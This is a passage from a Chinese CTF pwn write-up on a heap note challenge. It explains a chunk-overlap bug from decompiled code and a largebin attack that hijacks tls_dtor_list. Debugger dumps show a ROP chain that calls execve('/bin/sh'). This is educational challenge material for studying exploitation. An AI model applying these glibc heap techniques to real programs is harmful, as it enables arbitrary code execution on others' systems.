class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x3FF&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid size.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(size, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  real_size = read_n(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ptr, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = &amp;amp;gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;size = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ++nums;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;ptr = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6-&amp;gt;real_size = (__int64)real_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __printf_chk(&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Note%lu saved.\n&amp;quot;&lt;/span&gt;, count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;数组最小限制为 0x400, 没有上限，所以我们可以尽情的构造较大的 chunk。&lt;/p&gt;
&lt;p&gt;观察到，数组溢出时候的情况。因为我们申请 gp 数组的堆块大小只有 0xb0, 实际使用空间只有 0xa8, 那么，我们申请的 7 个结构体恰好可以沾满，那么第 8 个结构体的 size 就会占据下一个 chunk 的头部，修改 chunk_size。如果我们前面的 chunk 申请的比较小，第八个申请的很大，就会导致第一个 chunk 的 size 被更改，实现 overlap。&lt;/p&gt;
&lt;p&gt;主义的时，一旦 8 号 chunk 申请处理啊，就无法 free。&lt;/p&gt;
&lt;p&gt;泄露地址。&lt;/p&gt;
&lt;p&gt;在向 note 中读入数据的时候，会自动补全空字符。输出使用格式化字符串，只是 add 时使用了 calloc，初始化 chunk。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *__fastcall &lt;span class=&#34;title function_&#34;&gt;read_n&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr, __int64 size)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *v3; &lt;span class=&#34;comment&#34;&gt;// r14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *pos; &lt;span class=&#34;comment&#34;&gt;// r15&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v5; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *end; &lt;span class=&#34;comment&#34;&gt;// r13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v7; &lt;span class=&#34;comment&#34;&gt;// rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+17h] [rbp-41h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v11; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v11 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pos = ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt; - (_QWORD)ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    end = &amp;amp;ptr[size];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v7 = (__int64)&amp;amp;pos[v5];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( read(fd, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;) &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || buf == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *pos++ = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( pos == end )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *pos = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_8:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3[size - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)v7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改掉第一个 notechunk 的 size 后，直接将其 free，就会将第二个覆盖到&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x5572d1a52290&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52290&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000000000b1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522a0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522b0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522c0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52770&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522d0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52b90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522e0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a522f0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a52fb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52300&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a533d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52310&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52320&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005572d1a537f0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52330&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00005572d1a53c10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52340&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000418&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000841&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//原本为0x421&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52350&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007fa2a9bbace0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fa2a9bbace0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5572d1a52360&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重新申请第一个 chunk 区域，第二个 chunk 的数据就会被更改了。&lt;/p&gt;
&lt;p&gt;我们就完成了 libc 的泄露，下面就是堆 heap 地址的泄露，只要有了 overlap 我们就完成了两地址的泄露 ，这里不在细说。&lt;/p&gt;
&lt;p&gt;接下来就是利用 largebinattack 攻击，首先修改 tls_dtor_list 的值为一个我们可控制的 chunk 地址。然后修改 secret 为已知可控地址。secret 是 tcache,fastbin 加密 key。&lt;/p&gt;
&lt;p&gt;tls_dtor_list 结构体的为&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;*(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; dtor_list *) &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  func = &lt;span class=&#34;number&#34;&gt;0x525a0543f9580000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  obj = &lt;span class=&#34;number&#34;&gt;0x7f16ef9363e5&lt;/span&gt; &amp;lt;iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0x7f16efae4698&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next = &lt;span class=&#34;number&#34;&gt;0x7f16ef937e51&lt;/span&gt; &amp;lt;__gconv_close_transform+&lt;span class=&#34;number&#34;&gt;225&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+++++++++++++++++++++++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tel &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d920&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x525a0543f9580000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d928&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef9363e5&lt;/span&gt; (iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;) ◂— pop    rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d930&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16efae4698&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x68732f6e69622f&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;/bin/sh&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d938&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef937e51&lt;/span&gt; (__gconv_close_transform+&lt;span class=&#34;number&#34;&gt;225&lt;/span&gt;) ◂— pop    rsi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d940&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d948&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16efa2b497&lt;/span&gt; (qecvt+&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;) ◂— pop    rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d950&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d958&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0040&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x563bed37d960&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f16ef9f70f0&lt;/span&gt; (execve) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结下，这里。00 的位置，其实是任意代码执行的，除了可以写 leave，但是貌似这里的写法已经很直接，所以我们无需再更改，如有需要可以写为 orw.secret 其实是否需要改写，是根据是否可以泄露出 secret 而定，如果可以，就不需要改写，一些攻击即可。&lt;/p&gt;
&lt;p&gt;我们修改 tls_dtor_list 为一个堆头地址，我们还要将这个头部改写，因为任意代码执行就是这个直接地址开始的。&lt;/p&gt;
&lt;p&gt;关于 largebinattack，如果 bin 只有一个 free_chunk，我们攻击的话，只需要修改其 bk_nextsize。&lt;/p&gt;
&lt;p&gt;同时，我们也可以进行多次攻击，只要是 size 比第一个小，就会进行前插，但是这次不是修改第一个头的 bk_next, 而是第一次那个。就是说在同一个位置修改，其他尽量保持不变。&lt;/p&gt;
&lt;p&gt;关键就在与修改 tls_dtor_list，开始这里是空的，将其指向一个 chunk, 并且完全控制这里，在这里构造一个 leave ret 加上 rop，注意的是 leaveret 的地址要进行加密。&lt;/p&gt;
&lt;h2 id=&#34;house-of-cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#house-of-cat&#34;&gt;#&lt;/a&gt; house of cat&lt;/h2&gt;
